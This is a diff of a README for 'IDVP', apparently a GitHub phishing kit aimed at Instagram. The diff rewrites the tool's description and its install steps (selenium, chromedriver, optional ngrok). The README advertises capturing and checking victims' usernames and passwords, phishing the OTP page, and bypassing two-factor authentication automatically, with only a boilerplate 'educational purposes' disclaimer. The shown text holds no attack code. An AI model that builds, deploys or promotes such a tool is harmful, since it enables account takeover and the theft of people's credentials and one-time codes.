@@ -1,16 +1,23 @@
-# Instagram Bypass Double Verification 
+# Instagram Double Verification Phishing (IDVP)
 ### Description
-Python Code for Phishing Instagram with double verification
+- IDVP helps Phishing the instagram page to another level 
+- Cross checks the username and password
+- If Double Authentication is enabled, IDVP helps you to bypass it 
+- Phishes the OTP Page too (Fully Automated)
 
 ### Coded : @The-Robin-Hood https://github.com/The-Robin-Hood/
 
 # Legal Disclaimer:
 Usage of IDVP for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
 
+# Tested PlatForms
+1. Windows 10
+2. Kali linux
+
 # Requirements:
 1. Python3
 2. PHP
-3. Chromium Driver 
+3. Chrome-Driver 
 
 Optional: Ngrok (Installed and configured with authtoken)
 
@@ -19,18 +26,16 @@ Optional: Ngrok (Installed and configured with authtoken)
    git clone https://github.com/The-Robin-Hood/InstaDoubleVerifyPhish
 2. cd InstaDoubleVerifyPhish
 3. pip install selenium
-4. Windows : curl https://chromedriver.storage.googleapis.com/89.0.4389.23/chromedriver_win32.zip -o chromium.zip  
-   Linux   : wget https://chromedriver.storage.googleapis.com/89.0.4389.23/chromedriver_linux64.zip 
-5. unzip the file
+4. Windows : 
+   -  curl https://chromedriver.storage.googleapis.com/89.0.4389.23/chromedriver_win32.zip -o chromium.zip
+   -  Extract it to C://Windows/System32 (or) to whatever environmental PATH 
+5. Linux   : `apt install chromedriver`
 6. python IDVP.py
 
 *If ngrok needed :*
-- Windows x64 : `curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip`
-- Windows x32 : `curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-386.zip -o ngrok.zip`
-- Linux       : `wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip`
-- Linux-ARM   : `wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip`
-- unzip it 
-- `./ngrok authtoken <your_token>`
+- Download it from https://ngrok.com 
+- Extract it and set to the PATH
+- ./ngrok authtoken <your_token>
 
 # Screenshot:
-![IDVP](https://user-images.githubusercontent.com/32297581/110248920-6ec41480-7f99-11eb-97ae-86adc0499c3a.png)
+
